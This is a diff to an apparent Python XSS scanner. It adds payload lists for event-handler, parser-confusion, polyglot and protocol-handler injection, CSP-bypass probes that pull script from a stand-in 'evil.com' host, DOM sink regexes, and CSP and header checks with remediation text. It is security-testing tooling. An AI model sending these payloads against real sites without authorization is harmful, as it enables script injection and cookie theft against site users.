@@ -58,6 +58,11 @@ XSS_2026_TECHNIQUES = [
             '<details open ontoggle=alert(1)>',
             '"><img src=x onerror=alert(1)>',
             "'-alert(1)-'",
+            '<body onload=alert(1)>',
+            '<input onfocus=alert(1) autofocus>',
+            '<marquee onstart=alert(1)>',
+            '<video><source onerror=alert(1)>',
+            '<audio src=x onerror=alert(1)>',
         ],
     },
     {
@@ -67,6 +72,9 @@ XSS_2026_TECHNIQUES = [
         "payloads": [
             '<noscript><p title="</noscript><img src=x onerror=alert(1)>">',
             '<math><mtext><table><mglyph><svg><mtext><textarea><path id="</textarea><img onerror=alert(1) src=1>">',
+            '<select><noembed></select><img src=x onerror=alert(1)>',
+            '<listing><img src=x onerror=alert(1)>',
+            '<xmp><img src=x onerror=alert(1)></xmp>',
         ],
     },
     {
@@ -76,6 +84,8 @@ XSS_2026_TECHNIQUES = [
         "payloads": [
             '<script nonce="random">alert(1)</script>',
             '<link rel=preload href=//evil.com/script.js as=script>',
+            '<script src=//ssl.google-analytics.com/ga.js></script>',
+            '<link rel=dns-prefetch href=//evil.com>',
         ],
     },
     {
@@ -86,8 +96,76 @@ XSS_2026_TECHNIQUES = [
             'jaVasCript:/*-/*`/*\\`/*\'/*"/**/(/* */oNcliCk=alert() )//',
             '"><img src=x onerror=alert(1)//',
             "';alert(1)//",
+            '"><svg/onload=alert(1)>',
+            '"><iframe/src="javascript:alert(1)">',
         ],
     },
+    {
+        "id": "event_handler",
+        "name": "Event Handler XSS",
+        "description": "XSS via event handler attributes",
+        "payloads": [
+            '<img src=x onerror=alert(1)>',
+            '<svg/onload=alert(1)>',
+            '<body/onload=alert(1)>',
+            '<input/onfocus=alert(1) autofocus>',
+            '<details/open/ontoggle=alert(1)>',
+            '<video/onloadeddata=alert(1)>',
+            '<audio/onauxclick=alert(1)>',
+            '<textarea/oninput=alert(1)>',
+            '<select/onchange=alert(1)><option>1</select>',
+            '<div/onpointerdown=alert(1)>',
+        ],
+    },
+    {
+        "id": "protocol_handler",
+        "name": "Protocol Handler XSS",
+        "description": "XSS via protocol handlers (javascript:, data:, vbscript:)",
+        "payloads": [
+            'javascript:alert(1)',
+            'data:text/html,<script>alert(1)</script>',
+            'vbscript:MsgBox(1)',
+            'javascript:alert(document.cookie)',
+            'data:text/html;base64,PHNjcmlwdD5hbGVydCgxKTwvc2NyaXB0Pg==',
+        ],
+    },
+]
+
+# DOM sink patterns for vulnerability detection
+DOM_SINK_PATTERNS = [
+    # Source patterns (where user input enters)
+    r'document\.URL',
+    r'document\.documentURI',
+    r'document\.referrer',
+    r'location\.href',
+    r'location\.search',
+    r'location\.hash',
+    r'window\.name',
+    # Sink patterns (where dangerous execution happens)
+    r'document\.write',
+    r'document\.writeln',
+    r'innerHTML',
+    r'outerHTML',
+    r'eval\(',
+    r'setTimeout\(',
+    r'setInterval\(',
+    r'new Function\(',
+    r'element\.src',
+    r'element\.href',
+    r'element\.action',
+    r'element\.formAction',
+]
+
+# CSP directive weaknesses
+CSP_WEAKNESSES = [
+    ("unsafe-inline", "Allows inline scripts", "high"),
+    ("unsafe-eval", "Allows eval()", "high"),
+    ("*", "Wildcard allows any source", "high"),
+    ("data:", "Allows data: URIs", "medium"),
+    ("blob:", "Allows blob: URIs", "medium"),
+    ("http:", "Allows HTTP resources", "medium"),
+    ("'unsafe-hashes'", "Allows specific inline handlers", "medium"),
+    ("strict-dynamic", "May allow bypass with trusted scripts", "low"),
 ]
 
 
@@ -130,6 +208,20 @@ def test_xss(
         # Test Polyglot payloads
         if techniques is None or "polyglot" in techniques:
             _test_polyglot_xss(client, target, param, result)
+        
+        # Test event handlers
+        if techniques is None or "event_handler" in techniques:
+            _test_event_handler_xss(client, target, param, result)
+        
+        # Test protocol handlers
+        if techniques is None or "protocol_handler" in techniques:
+            _test_protocol_handler_xss(client, target, param, result)
+        
+        # Analyze DOM sinks
+        _analyze_dom_sinks(client, target, param, result)
+        
+        # Check security headers
+        _check_xss_headers(client, target, result)
 
     # Save results
     output_file = Path(output_dir) / "xss_results.json"
@@ -243,26 +335,71 @@ def _test_csp_bypass(client: httpx.Client, target: str, param: str, result: XSSR
             ))
             return
         
-        # Check for weak CSP directives
-        weak_directives = [
-            ("unsafe-inline", "Allows inline scripts"),
-            ("unsafe-eval", "Allows eval()"),
-            ("*", "Wildcard allows any source"),
-            ("data:", "Allows data: URIs"),
-        ]
+        # Analyze CSP directives
+        csp_analysis = _analyze_csp(csp_header)
         
-        for directive, description in weak_directives:
-            if directive in csp_header:
+        # Report weak CSP configurations
+        for weakness in CSP_WEAKNESSES:
+            if weakness[0] in csp_header:
                 result.findings.append(XSSFinding(
                     category="xss",
-                    severity="medium",
-                    title=f"Weak CSP: {directive}",
-                    description=description,
+                    severity=weakness[2],
+                    title=f"Weak CSP: {weakness[0]}",
+                    description=weakness[1],
                     endpoint=url,
-                    remediation=f"Remove {directive} from CSP directive",
+                    evidence=f"CSP header: {csp_header[:200]}",
+                    remediation=f"Remove {weakness[0]} from CSP directive",
                 ))
+        
+        # Check for missing critical directives
+        missing_directives = _check_missing_csp_directives(csp_header)
+        for directive in missing_directives:
+            result.findings.append(XSSFinding(
+                category="xss",
+                severity="medium",
+                title=f"Missing CSP Directive: {directive}",
+                description=f"Content Security Policy missing {directive} directive",
+                endpoint=url,
+                remediation=f"Add {directive} directive to CSP",
+            ))
     except Exception as e:
         logger.debug(f"CSP check failed: {e}")
+
+
+def _analyze_csp(csp_header: str) -> dict:
+    """Analyze CSP header and return parsed directives."""
+    directives = {}
+    
+    for directive in csp_header.split(";"):
+        directive = directive.strip()
+        if " " in directive:
+            key, value = directive.split(" ", 1)
+            directives[key.lower()] = value
+    
+    return directives
+
+
+def _check_missing_csp_directives(csp_header: str) -> list:
+    """Check for missing critical CSP directives."""
+    critical_directives = [
+        "default-src",
+        "script-src",
+        "style-src",
+        "img-src",
+        "connect-src",
+        "font-src",
+        "object-src",
+        "media-src",
+        "frame-src",
+    ]
+    
+    missing = []
+    
+    for directive in critical_directives:
+        if directive not in csp_header.lower():
+            missing.append(directive)
+    
+    return missing
 
 
 def _test_polyglot_xss(client: httpx.Client, target: str, param: str, result: XSSResult):
@@ -296,6 +433,162 @@ def _test_polyglot_xss(client: httpx.Client, target: str, param: str, result: XS
                 ))
         except Exception:
             continue
+
+
+def _test_event_handler_xss(client: httpx.Client, target: str, param: str, result: XSSResult):
+    """Test for XSS via event handler attributes."""
+    logger.info("Testing event handler XSS...")
+    
+    event_handler_payloads = [
+        '<img src=x onerror=alert(1)>',
+        '<svg/onload=alert(1)>',
+        '<body/onload=alert(1)>',
+        '<input/onfocus=alert(1) autofocus>',
+        '<details/open/ontoggle=alert(1)>',
+        '<video/onloadeddata=alert(1)>',
+        '<audio/onauxclick=alert(1)>',
+        '<textarea/oninput=alert(1)>',
+        '<select/onchange=alert(1)><option>1</select>',
+        '<div/onpointerdown=alert(1)>',
+    ]
+    
+    base_url = target.rstrip("/")
+    
+    for payload in event_handler_payloads:
+        try:
+            url = f"{base_url}?{param}={payload}"
+            resp = client.get(url)
+            
+            # Check if payload is reflected and executable
+            if payload in resp.text:
+                # Check for HTML attribute context
+                if re.search(r'<[^>]*' + re.escape(payload[:20]), resp.text):
+                    result.findings.append(XSSFinding(
+                        category="xss",
+                        severity="high",
+                        title="Event Handler XSS",
+                        description="Payload reflected in HTML attribute context",
+                        endpoint=url,
+                        payload=payload[:100],
+                        remediation="Sanitize input, use Content Security Policy",
+                    ))
+        except Exception:
+            continue
+
+
+def _test_protocol_handler_xss(client: httpx.Client, target: str, param: str, result: XSSResult):
+    """Test for XSS via protocol handlers."""
+    logger.info("Testing protocol handler XSS...")
+    
+    protocol_payloads = [
+        'javascript:alert(1)',
+        'data:text/html,<script>alert(1)</script>',
+        'vbscript:MsgBox(1)',
+        'javascript:alert(document.cookie)',
+        'data:text/html;base64,PHNjcmlwdD5hbGVydCgxKTwvc2NyaXB0Pg==',
+    ]
+    
+    base_url = target.rstrip("/")
+    
+    for payload in protocol_payloads:
+        try:
+            # Test in href parameter
+            url = f"{base_url}?{param}={payload}"
+            resp = client.get(url)
+            
+            # Check if payload is reflected as a link
+            if payload in resp.text:
+                result.findings.append(XSSFinding(
+                    category="xss",
+                    severity="critical",
+                    title="Protocol Handler XSS",
+                    description=f"Protocol handler payload reflected: {payload[:50]}",
+                    endpoint=url,
+                    payload=payload[:100],
+                    remediation="Validate and sanitize URLs, reject dangerous protocols",
+                ))
+        except Exception:
+            continue
+
+
+def _analyze_dom_sinks(client: httpx.Client, target: str, param: str, result: XSSResult):
+    """Analyze page for DOM-based XSS sinks."""
+    logger.info("Analyzing DOM sinks...")
+    
+    base_url = target.rstrip("/")
+    
+    try:
+        # First, get the page with a marker to see if it's reflected
+        marker = "xss_test_marker_12345"
+        url = f"{base_url}?{param}={marker}"
+        resp = client.get(url)
+        
+        if marker not in resp.text:
+            return  # Parameter not reflected
+        
+        # Look for DOM sink patterns in the response
+        for pattern in DOM_SINK_PATTERNS:
+            if re.search(pattern, resp.text):
+                # Check if there's a potential source-sink relationship
+                result.findings.append(XSSFinding(
+                    category="xss",
+                    severity="high",
+                    title="DOM Sink Detected",
+                    description=f"Potentially dangerous DOM manipulation found: {pattern}",
+                    endpoint=url,
+                    evidence=f"Pattern: {pattern}",
+                    remediation="Audit DOM manipulation, use safe APIs like textContent instead of innerHTML",
+                ))
+    except Exception as e:
+        logger.debug(f"DOM sink analysis failed: {e}")
+
+
+def _check_xss_headers(client: httpx.Client, target: str, result: XSSResult):
+    """Check security headers that affect XSS protection."""
+    logger.info("Checking XSS security headers...")
+    
+    try:
+        url = f"https://{target}"
+        resp = client.get(url)
+        
+        headers_to_check = {
+            "x-content-type-options": {
+                "expected": "nosniff",
+                "severity": "medium",
+                "title": "Missing X-Content-Type-Options",
+                "description": "Browser may MIME-sniff content type",
+                "remediation": "Add X-Content-Type-Options: nosniff header",
+            },
+            "x-frame-options": {
+                "expected": ["DENY", "SAMEORIGIN"],
+                "severity": "medium",
+                "title": "Missing X-Frame-Options",
+                "description": "Page may be vulnerable to clickjacking",
+                "remediation": "Add X-Frame-Options: DENY or SAMEORIGIN header",
+            },
+            "x-xss-protection": {
+                "expected": "0",
+                "severity": "low",
+                "title": "X-XSS-Protection Header Present",
+                "description": "Legacy XSS filter may cause issues",
+                "remediation": "Set X-XSS-Protection: 0 and use CSP instead",
+            },
+        }
+        
+        for header_name, config in headers_to_check.items():
+            header_value = resp.headers.get(header_name, "")
+            
+            if not header_value:
+                result.findings.append(XSSFinding(
+                    category="xss",
+                    severity=config["severity"],
+                    title=config["title"],
+                    description=config["description"],
+                    endpoint=url,
+                    remediation=config["remediation"],
+                ))
+    except Exception as e:
+        logger.debug(f"Header check failed: {e}")
 
 
 def _save_results(result: XSSResult, output_file: Path):
